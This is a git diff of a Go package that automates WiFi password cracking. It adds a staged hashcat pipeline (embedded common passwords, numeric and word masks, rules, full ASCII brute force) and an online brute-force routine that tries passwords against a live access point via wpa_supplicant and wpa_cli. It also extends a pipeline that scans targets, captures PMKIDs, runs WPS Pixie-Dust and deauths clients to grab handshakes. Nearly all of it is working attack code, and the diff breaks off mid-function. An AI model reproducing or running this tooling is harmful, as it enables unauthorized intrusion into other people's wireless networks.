@@ -1,18 +1,20 @@
 // Package crack orchestrates WPA/WPA2/WPA3 password cracking.
 //
 // It wraps proven external tools (hcxdumptool, hcxpcapngtool, hashcat,
-// aircrack-ng, reaver, wash) and does NOT implement any cryptographic
-// operations itself.
+// aircrack-ng, reaver, wash, wpa_supplicant) and does NOT implement any
+// cryptographic operations itself.
 //
 // Techniques (ordered by effectiveness):
 //
-//  1. PMKID capture      -- client-less, extract PMKID from AP's first message (~60% of APs)
-//  2. WPS Pixie-Dust     -- exploits weak RNG in WPS (~30% of WPS-enabled APs, 5-30s)
-//  3. Hashcat crack      -- GPU-accelerated cracking (PMKID or handshake)
-//  4. Handshake capture  -- deauth a client, capture 4-way handshake
-//  5. Hashcat crack      -- GPU-accelerated cracking of handshake
-//  6. WPS PIN brute      -- brute force 8-digit WPS PIN (2-10 hours, last resort)
-//  7. Dictionary attack  -- wordlist-based cracking via aircrack-ng (CPU fallback)
+//  1. PMKID capture          -- client-less, extract PMKID from AP's first message (~60% of APs)
+//  2. WPS Pixie-Dust         -- exploits weak RNG in WPS (~30% of WPS-enabled APs, 5-30s)
+//  3. SmartCrack (stages 1-3)-- common passwords, numeric patterns, word+number combos
+//  4. Handshake capture      -- deauth a client, capture 4-way handshake
+//  5. SmartCrack (stages 1-3)-- same as step 3 but on handshake hash
+//  6. Dictionary attack      -- rockyou.txt + hashcat rules + aircrack-ng CPU fallback
+//  7. WPS PIN brute          -- brute force 8-digit WPS PIN (2-10 hours)
+//  8. Smart brute force      -- hashcat masks + rules (lower+digits, patterns)
+//  9. Online brute force     -- wpa_supplicant PSK attempts (no monitor mode needed, ~20/min)
 //
 // On macOS, monitor mode requires a compatible external USB WiFi adapter.
 // The built-in card does not support it.
@@ -21,6 +23,7 @@ package crack
 import (
 	"encoding/json"
 	"fmt"
+	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -42,12 +45,14 @@ import (
 type Method string
 
 const (
-	PMKID      Method = "pmkid_capture"
-	Handshake  Method = "handshake_capture"
-	Hashcat    Method = "hashcat_crack"
-	Dictionary Method = "dictionary_attack"
-	WPSPixie   Method = "wps_pixie_dust"
-	WPSPin     Method = "wps_pin_brute"
+	PMKID       Method = "pmkid_capture"
+	Handshake   Method = "handshake_capture"
+	Hashcat     Method = "hashcat_crack"
+	Dictionary  Method = "dictionary_attack"
+	WPSPixie    Method = "wps_pixie_dust"
+	WPSPin      Method = "wps_pin_brute"
+	OnlineBrute Method = "online_brute_force"
+	SmartCrackM Method = "smart_crack"
 )
 
 // WifiTarget represents a WiFi network identified during scanning.
@@ -1257,6 +1262,642 @@ func CrackWithAircrack(captureFile, wordlist string) (*Result, error) {
 }
 
 // ---------------------------------------------------------------------------
+// Smart cracking pipeline
+// ---------------------------------------------------------------------------
+
+// SmartCrack tries attacks in order of probability, from common passwords
+// to increasingly complex brute force patterns. Returns immediately on first
+// success. Each stage has its own timeout and moves to the next if not cracked.
+//
+// Stages:
+//  1. Common passwords (embedded top 1000 WiFi passwords) - < 1 min
+//  2. Numeric patterns (8-10 digit masks) - < 5 min
+//  3. Common word+number combos (hashcat rules on small wordlist) - < 10 min
+//  4. Dictionary (rockyou.txt if available) - < 30 min
+//  5. Smart brute force (masks + rules for common patterns) - hours
+//  6. Full brute force (all printable ASCII, 8-12 chars) - days, only if fullBrute=true
+func SmartCrack(hashFile string, timeout time.Duration, fullBrute bool) (*Result, error) {
+	start := time.Now()
+
+	if _, err := os.Stat(hashFile); os.IsNotExist(err) {
+		return &Result{
+			Method:  SmartCrackM,
+			Success: false,
+			Details: fmt.Sprintf("Hash file not found: %s", hashFile),
+			Elapsed: time.Since(start),
+		}, nil
+	}
+
+	hashcatPath, err := findHashcat()
+	if err != nil {
+		return &Result{
+			Method:  SmartCrackM,
+			Success: false,
+			Details: fmt.Sprintf("hashcat not found: %v", err),
+			Elapsed: time.Since(start),
+		}, nil
+	}
+
+	// Stage 1: Common WiFi passwords (embedded list).
+	log.Printf("[smart-crack] Stage 1/6: Trying %d common WiFi passwords...", len(commonWifiPasswords))
+	stageTimeout := min(1*time.Minute, timeout)
+	if result := smartCrackCommonPasswords(hashFile, hashcatPath, stageTimeout, start); result != nil {
+		return result, nil
+	}
+	if time.Since(start) >= timeout {
+		return smartCrackTimeout(hashFile, "Stage 1 (common passwords)", start), nil
+	}
+
+	// Stage 2: Numeric patterns (8-digit, dates, 9-digit, 10-digit).
+	log.Printf("[smart-crack] Stage 2/6: Trying numeric mask patterns...")
+	stageTimeout = min(5*time.Minute, timeout-time.Since(start))
+	if result := smartCrackNumericMasks(hashFile, hashcatPath, stageTimeout, start); result != nil {
+		return result, nil
+	}
+	if time.Since(start) >= timeout {
+		return smartCrackTimeout(hashFile, "Stage 2 (numeric patterns)", start), nil
+	}
+
+	// Stage 3: Common word + number combos (rules on embedded wordlist).
+	log.Printf("[smart-crack] Stage 3/6: Trying word+number combos with rules...")
+	stageTimeout = min(10*time.Minute, timeout-time.Since(start))
+	if result := smartCrackWordNumberRules(hashFile, hashcatPath, stageTimeout, start); result != nil {
+		return result, nil
+	}
+	if time.Since(start) >= timeout {
+		return smartCrackTimeout(hashFile, "Stage 3 (word+number combos)", start), nil
+	}
+
+	// Stage 4: Dictionary attack (rockyou.txt if available).
+	wordlists := FindWordlists()
+	if len(wordlists) > 0 {
+		log.Printf("[smart-crack] Stage 4/6: Dictionary attack with %s...", filepath.Base(wordlists[0]))
+		stageTimeout = min(30*time.Minute, timeout-time.Since(start))
+		if result := smartCrackDictionary(hashFile, hashcatPath, wordlists[0], stageTimeout, start); result != nil {
+			return result, nil
+		}
+	} else {
+		log.Printf("[smart-crack] Stage 4/6: Skipped (no wordlist found)")
+	}
+	if time.Since(start) >= timeout {
+		return smartCrackTimeout(hashFile, "Stage 4 (dictionary)", start), nil
+	}
+
+	// Stage 5: Smart brute force (alpha+digit masks, rules).
+	log.Printf("[smart-crack] Stage 5/6: Smart brute force with masks and rules...")
+	stageTimeout = timeout - time.Since(start)
+	if !fullBrute {
+		// Cap at 2 hours if full brute not requested.
+		stageTimeout = min(2*time.Hour, stageTimeout)
+	}
+	if result := smartCrackMasks(hashFile, hashcatPath, stageTimeout, start); result != nil {
+		return result, nil
+	}
+	if time.Since(start) >= timeout {
+		return smartCrackTimeout(hashFile, "Stage 5 (smart brute force)", start), nil
+	}
+
+	// Stage 6: Full brute force (only if explicitly requested).
+	if fullBrute {
+		log.Printf("[smart-crack] Stage 6/6: Full brute force (all printable ASCII, 8-12 chars)...")
+		stageTimeout = timeout - time.Since(start)
+		if result := smartCrackFullBrute(hashFile, hashcatPath, stageTimeout, start); result != nil {
+			return result, nil
+		}
+	} else {
+		log.Printf("[smart-crack] Stage 6/6: Skipped (full brute force not requested)")
+	}
+
+	return &Result{
+		Method:      SmartCrackM,
+		Success:     false,
+		CaptureFile: hashFile,
+		Details:     fmt.Sprintf("All SmartCrack stages exhausted in %v", time.Since(start).Round(time.Second)),
+		Elapsed:     time.Since(start),
+	}, nil
+}
+
+// smartCrackCommonPasswords writes the embedded password list to a temp file
+// and runs hashcat in dictionary mode against it.
+func smartCrackCommonPasswords(hashFile, hashcatPath string, timeout time.Duration, start time.Time) *Result {
+	// Write common passwords to a temp file.
+	tmpFile, err := os.CreateTemp("", "nowifi-common-*.txt")
+	if err != nil {
+		return nil
+	}
+	defer os.Remove(tmpFile.Name())
+
+	for _, pw := range commonWifiPasswords {
+		fmt.Fprintln(tmpFile, pw)
+	}
+	tmpFile.Close()
+
+	args := buildHashcatArgs(hashFile, "-a", "0", hashFile, tmpFile.Name())
+	password := runHashcatWithTimeout(hashcatPath, args, timeout)
+	if password != "" {
+		return &Result{
+			Method:      SmartCrackM,
+			Success:     true,
+			Password:    password,
+			CaptureFile: hashFile,
+			Details:     fmt.Sprintf("Cracked with common password list: %s", password),
+			Elapsed:     time.Since(start),
+		}
+	}
+	return nil
+}
+
+// smartCrackNumericMasks runs the numeric subset of hashcatMasks.
+func smartCrackNumericMasks(hashFile, hashcatPath string, timeout time.Duration, start time.Time) *Result {
+	stageStart := time.Now()
+	for _, mask := range hashcatMasks {
+		if time.Since(stageStart) >= timeout {
+			break
+		}
+		// Only run numeric-ish masks (those containing only ?d and literal digits).
+		if !isNumericMask(mask.Mask) {
+			continue
+		}
+		remaining := timeout - time.Since(stageStart)
+		maskTimeout := min(remaining, 2*time.Minute)
+
+		log.Printf("[smart-crack]   mask: %s (%s, est %s)", mask.Mask, mask.Name, mask.EstTime)
+		args := buildHashcatArgs(hashFile, "-a", "3", hashFile, mask.Mask)
+		password := runHashcatWithTimeout(hashcatPath, args, maskTimeout)
+		if password != "" {
+			return &Result{
+				Method:      SmartCrackM,
+				Success:     true,
+				Password:    password,
+				CaptureFile: hashFile,
+				Details:     fmt.Sprintf("Cracked with mask %s (%s): %s", mask.Mask, mask.Name, password),
+				Elapsed:     time.Since(start),
+			}
+		}
+	}
+	return nil
+}
+
+// smartCrackWordNumberRules runs the embedded wordlist with hashcat rules.
+func smartCrackWordNumberRules(hashFile, hashcatPath string, timeout time.Duration, start time.Time) *Result {
+	// Write a small focused wordlist of common base words.
+	tmpFile, err := os.CreateTemp("", "nowifi-bases-*.txt")
+	if err != nil {
+		return nil
+	}
+	defer os.Remove(tmpFile.Name())
+
+	baseWords := []string{
+		"password", "welcome", "letmein", "master", "dragon",
+		"monkey", "shadow", "sunshine", "trustno", "football",
+		"baseball", "soccer", "hockey", "basketball", "access",
+		"hello", "charlie", "donald", "batman", "superman",
+		"michael", "jordan", "robert", "daniel", "thomas",
+		"love", "princess", "angel", "summer", "winter",
+		"spring", "autumn", "internet", "network", "wireless",
+		"wifi", "admin", "guest", "home", "house",
+		"secret", "private", "test", "temp", "user",
+		"lucky", "happy", "strong", "power", "energy",
+		"tiger", "eagle", "falcon", "wolf", "bear",
+		"coffee", "pizza", "guitar", "music", "star",
+	}
+	for _, w := range baseWords {
+		fmt.Fprintln(tmpFile, w)
+	}
+	tmpFile.Close()
+
+	// Try with best64.rule first.
+	rules := findHashcatRules(hashcatPath)
+	if rules != "" {
+		stageStart := time.Now()
+		remaining := timeout - time.Since(stageStart)
+		args := buildHashcatArgs(hashFile, "-a", "0", "-r", rules, hashFile, tmpFile.Name())
+		password := runHashcatWithTimeout(hashcatPath, args, min(remaining, 5*time.Minute))
+		if password != "" {
+			return &Result{
+				Method:      SmartCrackM,
+				Success:     true,
+				Password:    password,
+				CaptureFile: hashFile,
+				Details:     fmt.Sprintf("Cracked with rules (%s): %s", filepath.Base(rules), password),
+				Elapsed:     time.Since(start),
+			}
+		}
+	}
+
+	// Try d3ad0ne.rule if available.
+	d3ad0neRule := findHashcatRuleByName(hashcatPath, "d3ad0ne.rule")
+	if d3ad0neRule != "" {
+		stageStart := time.Now()
+		remaining := timeout - time.Since(stageStart)
+		args := buildHashcatArgs(hashFile, "-a", "0", "-r", d3ad0neRule, hashFile, tmpFile.Name())
+		password := runHashcatWithTimeout(hashcatPath, args, min(remaining, 5*time.Minute))
+		if password != "" {
+			return &Result{
+				Method:      SmartCrackM,
+				Success:     true,
+				Password:    password,
+				CaptureFile: hashFile,
+				Details:     fmt.Sprintf("Cracked with d3ad0ne rules: %s", password),
+				Elapsed:     time.Since(start),
+			}
+		}
+	}
+
+	return nil
+}
+
+// smartCrackDictionary runs a dictionary attack with an external wordlist.
+func smartCrackDictionary(hashFile, hashcatPath, wordlist string, timeout time.Duration, start time.Time) *Result {
+	// Plain dictionary first.
+	args := buildHashcatArgs(hashFile, "-a", "0", hashFile, wordlist)
+	password := runHashcatWithTimeout(hashcatPath, args, min(timeout/2, 15*time.Minute))
+	if password != "" {
+		return &Result{
+			Method:      SmartCrackM,
+			Success:     true,
+			Password:    password,
+			CaptureFile: hashFile,
+			Details:     fmt.Sprintf("Cracked with dictionary (%s): %s", filepath.Base(wordlist), password),
+			Elapsed:     time.Since(start),
+		}
+	}
+
+	// Dictionary + best64 rules.
+	rules := findHashcatRules(hashcatPath)
+	if rules != "" {
+		remaining := timeout - time.Since(start)
+		args = buildHashcatArgs(hashFile, "-a", "0", "-r", rules, hashFile, wordlist)
+		password = runHashcatWithTimeout(hashcatPath, args, min(remaining, 15*time.Minute))
+		if password != "" {
+			return &Result{
+				Method:      SmartCrackM,
+				Success:     true,
+				Password:    password,
+				CaptureFile: hashFile,
+				Details:     fmt.Sprintf("Cracked with dictionary+rules (%s + %s): %s", filepath.Base(wordlist), filepath.Base(rules), password),
+				Elapsed:     time.Since(start),
+			}
+		}
+	}
+
+	return nil
+}
+
+// smartCrackMasks runs all alpha+digit mask patterns.
+func smartCrackMasks(hashFile, hashcatPath string, timeout time.Duration, start time.Time) *Result {
+	stageStart := time.Now()
+	for _, mask := range hashcatMasks {
+		if time.Since(stageStart) >= timeout {
+			break
+		}
+		// Skip numeric masks (already tried in stage 2).
+		if isNumericMask(mask.Mask) {
+			continue
+		}
+		remaining := timeout - time.Since(stageStart)
+		// Give each mask a proportional timeout, min 30s, max 30 min.
+		maskTimeout := min(remaining, 30*time.Minute)
+		if maskTimeout < 30*time.Second {
+			break
+		}
+
+		log.Printf("[smart-crack]   mask: %s (%s, est %s)", mask.Mask, mask.Name, mask.EstTime)
+		args := buildHashcatArgs(hashFile, "-a", "3", hashFile, mask.Mask)
+		password := runHashcatWithTimeout(hashcatPath, args, maskTimeout)
+		if password != "" {
+			return &Result{
+				Method:      SmartCrackM,
+				Success:     true,
+				Password:    password,
+				CaptureFile: hashFile,
+				Details:     fmt.Sprintf("Cracked with mask %s (%s): %s", mask.Mask, mask.Name, password),
+				Elapsed:     time.Since(start),
+			}
+		}
+	}
+	return nil
+}
+
+// smartCrackFullBrute tries all printable ASCII 8-12 chars. Very slow, last resort.
+func smartCrackFullBrute(hashFile, hashcatPath string, timeout time.Duration, start time.Time) *Result {
+	stageStart := time.Now()
+
+	// Incrementing mask attack: ?a covers all printable ASCII.
+	// --increment from 8 to 12 chars.
+	remaining := timeout - time.Since(stageStart)
+	args := buildHashcatArgs(hashFile,
+		"-a", "3",
+		"--increment", "--increment-min=8", "--increment-max=12",
+		hashFile,
+		"?a?a?a?a?a?a?a?a?a?a?a?a",
+	)
+	password := runHashcatWithTimeout(hashcatPath, args, remaining)
+	if password != "" {
+		return &Result{
+			Method:      SmartCrackM,
+			Success:     true,
+			Password:    password,
+			CaptureFile: hashFile,
+			Details:     fmt.Sprintf("Cracked with full brute force: %s", password),
+			Elapsed:     time.Since(start),
+		}
+	}
+	return nil
+}
+
+// buildHashcatArgs constructs hashcat arguments with standard options.
+// The provided extraArgs are inserted before standard flags.
+func buildHashcatArgs(hashFile string, extraArgs ...string) []string {
+	args := []string{"-m", "22000"}
+	args = append(args, extraArgs...)
+	args = append(args,
+		"--potfile-disable",
+		"--status",
+		"--status-timer=10",
+		"-O",
+		"--quiet",
+	)
+	if isDarwin() {
+		args = append(args, "--backend-devices=1")
+	}
+	return args
+}
+
+// runHashcatWithTimeout runs hashcat with the given args and timeout,
+// returning the cracked password or empty string.
+func runHashcatWithTimeout(hashcatPath string, args []string, timeout time.Duration) string {
+	cmd := exec.Command(hashcatPath, args...)
+	out, _ := runCmdBytes(cmd, timeout)
+	return parseHashcatOutput(string(out))
+}
+
+// isNumericMask returns true if the mask only contains ?d placeholders and literal digits.
+func isNumericMask(mask string) bool {
+	// Replace all ?d with empty, then check if only digits remain.
+	stripped := strings.ReplaceAll(mask, "?d", "")
+	for _, c := range stripped {
+		if c < '0' || c > '9' {
+			return false
+		}
+	}
+	return true
+}
+
+// findHashcatRuleByName finds a specific hashcat rule file.
+func findHashcatRuleByName(hashcatPath, ruleName string) string {
+	hashcatDir := filepath.Dir(hashcatPath)
+	candidates := []string{
+		filepath.Join(hashcatDir, "rules", ruleName),
+		filepath.Join(hashcatDir, "..", "share", "hashcat", "rules", ruleName),
+		"/usr/share/hashcat/rules/" + ruleName,
+		"/opt/homebrew/share/hashcat/rules/" + ruleName,
+		"/usr/local/share/hashcat/rules/" + ruleName,
+	}
+	for _, c := range candidates {
+		if _, err := os.Stat(c); err == nil {
+			return c
+		}
+	}
+	return ""
+}
+
+// smartCrackTimeout returns a Result indicating the SmartCrack pipeline
+// ran out of time at the given stage.
+func smartCrackTimeout(hashFile, stage string, start time.Time) *Result {
+	return &Result{
+		Method:      SmartCrackM,
+		Success:     false,
+		CaptureFile: hashFile,
+		Details:     fmt.Sprintf("SmartCrack timeout at %s after %v", stage, time.Since(start).Round(time.Second)),
+		Elapsed:     time.Since(start),
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Online brute force (no monitor mode needed)
+// ---------------------------------------------------------------------------
+
+// OnlineBruteForce attempts PSK connections using wpa_supplicant in daemon mode.
+// Very slow (~20 attempts/min) but does NOT require monitor mode -- works with
+// any managed-mode WiFi interface. This is the last resort when all other
+// methods (which require monitor mode or captured hashes) have failed.
+//
+// It iterates through the embedded common password list, generating a
+// wpa_supplicant config for each candidate and attempting to associate.
+func OnlineBruteForce(target WifiTarget, iface string, timeout time.Duration) (*Result, error) {
+	start := time.Now()
+	result := &Result{Method: OnlineBrute, Success: false}
+
+	outputDir := timestampedDir("online_brute")
+	logFile := filepath.Join(outputDir, "online_brute.log")
+
+	// Check for wpa_supplicant or wpa_cli.
+	wpaSupplicant, err := findWpaSupplicant()
+	if err != nil {
+		result.Details = err.Error()
+		result.Elapsed = time.Since(start)
+		return result, nil
+	}
+
+	wpaCli, err := findWpaCli()
+	if err != nil {
+		// Fall back to wpa_supplicant config-per-attempt method.
+		return onlineBruteViaConfig(target, iface, wpaSupplicant, outputDir, logFile, timeout, start)
+	}
+
+	// Preferred method: use wpa_cli to test passwords via control interface.
+	return onlineBruteViaCli(target, iface, wpaSupplicant, wpaCli, outputDir, logFile, timeout, start)
+}
+
+// onlineBruteViaCli uses wpa_supplicant + wpa_cli to test passwords interactively.
+func onlineBruteViaCli(target WifiTarget, iface, wpaSupplicant, wpaCli, outputDir, logFile string, timeout time.Duration, start time.Time) (*Result, error) {
+	result := &Result{Method: OnlineBrute, Success: false}
+
+	// Start wpa_supplicant in daemon mode with a control interface.
+	ctrlDir := filepath.Join(outputDir, "ctrl")
+	_ = os.MkdirAll(ctrlDir, 0o755)
+
+	confFile := filepath.Join(outputDir, "wpa_base.conf")
+	conf := fmt.Sprintf("ctrl_interface=%s\n", ctrlDir)
+	if err := os.WriteFile(confFile, []byte(conf), 0o600); err != nil {
+		result.Details = fmt.Sprintf("failed to write wpa_supplicant config: %v", err)
+		result.Elapsed = time.Since(start)
+		return result, nil
+	}
+
+	// Start wpa_supplicant daemon.
+	supCmd := exec.Command("sudo", wpaSupplicant,
+		"-i", iface,
+		"-c", confFile,
+		"-B", // Daemonize
+		"-f", filepath.Join(outputDir, "wpa_supplicant.log"),
+	)
+	if err := supCmd.Run(); err != nil {
+		result.Details = fmt.Sprintf("failed to start wpa_supplicant: %v", err)
+		result.Elapsed = time.Since(start)
+		return result, nil
+	}
+
+	// Ensure we kill wpa_supplicant when done.
+	defer func() {
+		_ = exec.Command("sudo", "killall", "-9", "wpa_supplicant").Run()
+	}()
+
+	// Give wpa_supplicant time to initialize.
+	time.Sleep(2 * time.Second)
+
+	var logEntries []string
+	attempted := 0
+
+	for _, password := range commonWifiPasswords {
+		if time.Since(start) >= timeout {
+			break
+		}
+
+		attempted++
+		if attempted%50 == 0 {
+			log.Printf("[online-brute] Tried %d/%d passwords (%.1f%%)...",
+				attempted, len(commonWifiPasswords),
+				float64(attempted)/float64(len(commonWifiPasswords))*100)
+		}
+
+		// Add network via wpa_cli.
+		addOut := runWithTimeout(wpaCli, []string{"-i", iface, "add_network"}, 5*time.Second)
+		netID := strings.TrimSpace(addOut)
+		if netID == "" || netID == "FAIL" {
+			continue
+		}
+
+		// Configure network.
+		_ = runWithTimeout(wpaCli, []string{"-i", iface, "set_network", netID, "ssid", fmt.Sprintf(`"%s"`, target.SSID)}, 3*time.Second)
+		_ = runWithTimeout(wpaCli, []string{"-i", iface, "set_network", netID, "psk", fmt.Sprintf(`"%s"`, password)}, 3*time.Second)
+
+		// Enable and try to connect.
+		_ = runWithTimeout(wpaCli, []string{"-i", iface, "select_network", netID}, 3*time.Second)
+
+		// Wait for connection result (~3 seconds is typical).
+		time.Sleep(3 * time.Second)
+
+		// Check status.
+		statusOut := runWithTimeout(wpaCli, []string{"-i", iface, "status"}, 3*time.Second)
+		if strings.Contains(statusOut, "wpa_state=COMPLETED") &&
+			strings.Contains(statusOut, target.SSID) {
+			// Connected!
+			result.Success = true
+			result.Password = password
+			result.Details = fmt.Sprintf("Online brute force found password after %d attempts: %s", attempted, password)
+			result.CaptureFile = logFile
+			result.Elapsed = time.Since(start)
+
+			logEntries = append(logEntries, fmt.Sprintf("FOUND: %s (attempt %d)", password, attempted))
+			_ = os.WriteFile(logFile, []byte(strings.Join(logEntries, "\n")+"\n"), 0o644)
+
+			// Disconnect.
+			_ = runWithTimeout(wpaCli, []string{"-i", iface, "disconnect"}, 3*time.Second)
+			return result, nil
+		}
+
+		// Remove failed network.
+		_ = runWithTimeout(wpaCli, []string{"-i", iface, "remove_network", netID}, 3*time.Second)
+
+		logEntries = append(logEntries, fmt.Sprintf("FAIL: %s", password))
+	}
+
+	_ = os.WriteFile(logFile, []byte(strings.Join(logEntries, "\n")+"\n"), 0o644)
+
+	if time.Since(start) >= timeout {
+		result.Details = fmt.Sprintf("Online brute force timed out after %d attempts in %v", attempted, timeout)
+	} else {
+		result.Details = fmt.Sprintf("Online brute force exhausted %d common passwords", attempted)
+	}
+	result.CaptureFile = logFile
+	result.Elapsed = time.Since(start)
+	return result, nil
+}
+
+// onlineBruteViaConfig falls back to testing each password by restarting
+// wpa_supplicant with a new config file per attempt. Slower but works
+// without wpa_cli.
+func onlineBruteViaConfig(target WifiTarget, iface, wpaSupplicant, outputDir, logFile string, timeout time.Duration, start time.Time) (*Result, error) {
+	result := &Result{Method: OnlineBrute, Success: false}
+
+	var logEntries []string
+	attempted := 0
+
+	for _, password := range commonWifiPasswords {
+		if time.Since(start) >= timeout {
+			break
+		}
+
+		attempted++
+		if attempted%20 == 0 {
+			log.Printf("[online-brute] Tried %d/%d passwords (config mode, %.1f%%)...",
+				attempted, len(commonWifiPasswords),
+				float64(attempted)/float64(len(commonWifiPasswords))*100)
+		}
+
+		confFile := filepath.Join(outputDir, "wpa_attempt.conf")
+		conf := fmt.Sprintf("network={\n    ssid=\"%s\"\n    psk=\"%s\"\n    key_mgmt=WPA-PSK\n}\n",
+			target.SSID, password)
+		if err := os.WriteFile(confFile, []byte(conf), 0o600); err != nil {
+			continue
+		}
+
+		// Run wpa_supplicant for a brief connection attempt.
+		cmd := exec.Command("sudo", wpaSupplicant,
+			"-i", iface,
+			"-c", confFile,
+			"-D", "nl80211,wext",
+		)
+
+		out, _ := runCmdBytes(cmd, 5*time.Second)
+		outStr := string(out)
+
+		// Check for successful association.
+		if strings.Contains(outStr, "CTRL-EVENT-CONNECTED") ||
+			strings.Contains(outStr, "WPA: Key negotiation completed") {
+			result.Success = true
+			result.Password = password
+			result.Details = fmt.Sprintf("Online brute force found password after %d attempts: %s", attempted, password)
+			result.CaptureFile = logFile
+			result.Elapsed = time.Since(start)
+
+			logEntries = append(logEntries, fmt.Sprintf("FOUND: %s (attempt %d)", password, attempted))
+			_ = os.WriteFile(logFile, []byte(strings.Join(logEntries, "\n")+"\n"), 0o644)
+			return result, nil
+		}
+
+		logEntries = append(logEntries, fmt.Sprintf("FAIL: %s", password))
+
+		// Kill any lingering wpa_supplicant.
+		_ = exec.Command("sudo", "killall", "-9", "wpa_supplicant").Run()
+		time.Sleep(500 * time.Millisecond)
+	}
+
+	_ = os.WriteFile(logFile, []byte(strings.Join(logEntries, "\n")+"\n"), 0o644)
+
+	if time.Since(start) >= timeout {
+		result.Details = fmt.Sprintf("Online brute force timed out after %d attempts in %v", attempted, timeout)
+	} else {
+		result.Details = fmt.Sprintf("Online brute force exhausted %d common passwords (config mode)", attempted)
+	}
+	result.CaptureFile = logFile
+	result.Elapsed = time.Since(start)
+	return result, nil
+}
+
+// findWpaSupplicant locates the wpa_supplicant binary.
+func findWpaSupplicant() (string, error) {
+	return findTool("wpa_supplicant", "apt install wpasupplicant  OR  brew install wpa_supplicant")
+}
+
+// findWpaCli locates the wpa_cli binary.
+func findWpaCli() (string, error) {
+	return findTool("wpa_cli", "apt install wpasupplicant  OR  brew install wpa_supplicant")
+}
+
+// ---------------------------------------------------------------------------
 // Wordlist discovery
 // ---------------------------------------------------------------------------
 
@@ -1320,17 +1961,20 @@ func FindWordlists() []string {
 // RunCrack runs the full cracking pipeline against a target.
 //
 // Pipeline (ordered by speed and effectiveness):
-//  1. PMKID capture       -- client-less, ~60% of APs vulnerable
-//  2. WPS Pixie-Dust      -- fast (5-30s), ~30% of WPS-enabled APs
-//  3. Hashcat crack PMKID -- GPU-accelerated dictionary/brute
-//  4. Handshake capture   -- needs connected clients
-//  5. Hashcat crack handshake
-//  6. WPS PIN brute force -- slow (2-10h), last resort
-//  7. Aircrack-ng         -- CPU fallback if hashcat unavailable
+//  1. PMKID capture              -- client-less, ~60% of APs vulnerable
+//  2. WPS Pixie-Dust             -- fast (5-30s), ~30% of WPS-enabled APs
+//  3. SmartCrack PMKID (1-3)     -- common passwords + numeric patterns + word combos
+//  4. Handshake capture           -- needs connected clients
+//  5. SmartCrack handshake (1-3)  -- common passwords + numeric patterns + word combos
+//  6. Dictionary attack (stage 4) -- rockyou.txt if available
+//  7. WPS PIN brute force         -- slow (2-10h)
+//  8. Smart brute force (stage 5) -- masks + rules for common patterns
+//  9. Online brute force          -- last resort, no monitor mode needed
 func RunCrack(iface, targetSSID, wordlist string, timeout time.Duration) ([]Result, error) {
 	var results []Result
 
 	// Step 1: Scan for targets.
+	log.Printf("[crack] Step 1: Scanning for WiFi targets...")
 	scanDuration := 10
 	targets, err := ScanTargets(iface, scanDuration)
 	if err != nil || len(targets) == 0 {
@@ -1377,6 +2021,8 @@ func RunCrack(iface, targetSSID, wordlist string, timeout time.Duration) ([]Resu
 		}
 	}
 
+	log.Printf("[crack] Target: %s (%s) ch=%d signal=%ddBm", target.SSID, target.BSSID, target.Channel, target.Signal)
+
 	// Enrich target with WPS info if not already set.
 	if !target.WPSEnabled {
 		wpsTargets := ScanWPSTargets(iface, 10*time.Second)
@@ -1390,14 +2036,22 @@ func RunCrack(iface, targetSSID, wordlist string, timeout time.Duration) ([]Resu
 		}
 	}
 
+	// Collect hash files for SmartCrack stages later.
+	var hashFiles []string
+
 	// Step 3: Try PMKID capture (client-less, most effective).
+	log.Printf("[crack] Step 3: PMKID capture...")
 	pmkidResult, _ := CapturePMKID(*target, iface, timeout)
 	if pmkidResult != nil {
 		results = append(results, *pmkidResult)
+		if pmkidResult.Success && pmkidResult.CaptureFile != "" {
+			hashFiles = append(hashFiles, pmkidResult.CaptureFile)
+		}
 	}
 
 	// Step 4: WPS Pixie-Dust (fast, try before slow hashcat).
 	if target.WPSEnabled && !target.WPSLocked {
+		log.Printf("[crack] Step 4: WPS Pixie-Dust...")
 		pixieTimeout := timeout
 		if pixieTimeout > 5*time.Minute {
 			pixieTimeout = 5 * time.Minute
@@ -1411,61 +2065,53 @@ func RunCrack(iface, targetSSID, wordlist string, timeout time.Duration) ([]Resu
 		}
 	}
 
-	// Step 5: Crack PMKID with hashcat (if captured).
-	if pmkidResult != nil && pmkidResult.Success && pmkidResult.CaptureFile != "" {
-		crackResult, _ := CrackWithHashcat(pmkidResult.CaptureFile, wordlist)
-		if crackResult != nil {
-			results = append(results, *crackResult)
-			if crackResult.Success {
-				return results, nil
-			}
-		}
-
-		// Try brute force (8-digit numeric, common ISP defaults).
-		bruteResult, _ := crackWithHashcatMode(pmkidResult.CaptureFile, "brute", "")
-		if bruteResult != nil {
-			results = append(results, *bruteResult)
-			if bruteResult.Success {
-				return results, nil
-			}
-		}
-
-		// Aircrack-ng as fallback.
-		aircrackResult, _ := CrackWithAircrack(pmkidResult.CaptureFile, wordlist)
-		if aircrackResult != nil {
-			results = append(results, *aircrackResult)
-			if aircrackResult.Success {
+	// Step 5: SmartCrack stages 1-3 on PMKID hash (common passwords + patterns).
+	for _, hashFile := range hashFiles {
+		log.Printf("[crack] Step 5: SmartCrack (stages 1-3) on PMKID hash...")
+		smartTimeout := min(15*time.Minute, timeout)
+		smartResult, _ := SmartCrack(hashFile, smartTimeout, false)
+		if smartResult != nil {
+			results = append(results, *smartResult)
+			if smartResult.Success {
 				return results, nil
 			}
 		}
 	}
 
 	// Step 6: Try handshake capture (needs clients).
+	log.Printf("[crack] Step 6: Handshake capture...")
 	hsResult, _ := CaptureHandshake(*target, iface, timeout)
 	if hsResult != nil {
 		results = append(results, *hsResult)
-
 		if hsResult.Success && hsResult.CaptureFile != "" {
-			// Step 7: Crack handshake with hashcat.
-			crackResult, _ := CrackWithHashcat(hsResult.CaptureFile, wordlist)
-			if crackResult != nil {
-				results = append(results, *crackResult)
-				if crackResult.Success {
+			hashFiles = append(hashFiles, hsResult.CaptureFile)
+
+			// Step 7: SmartCrack stages 1-3 on handshake hash.
+			log.Printf("[crack] Step 7: SmartCrack (stages 1-3) on handshake hash...")
+			smartTimeout := min(15*time.Minute, timeout)
+			smartResult, _ := SmartCrack(hsResult.CaptureFile, smartTimeout, false)
+			if smartResult != nil {
+				results = append(results, *smartResult)
+				if smartResult.Success {
 					return results, nil
 				}
 			}
+		}
+	}
 
-			// Try brute force.
-			bruteResult, _ := crackWithHashcatMode(hsResult.CaptureFile, "brute", "")
-			if bruteResult != nil {
-				results = append(results, *bruteResult)
-				if bruteResult.Success {
+	// Step 8: Dictionary attack (stage 4) on all hash files.
+	if len(hashFiles) > 0 {
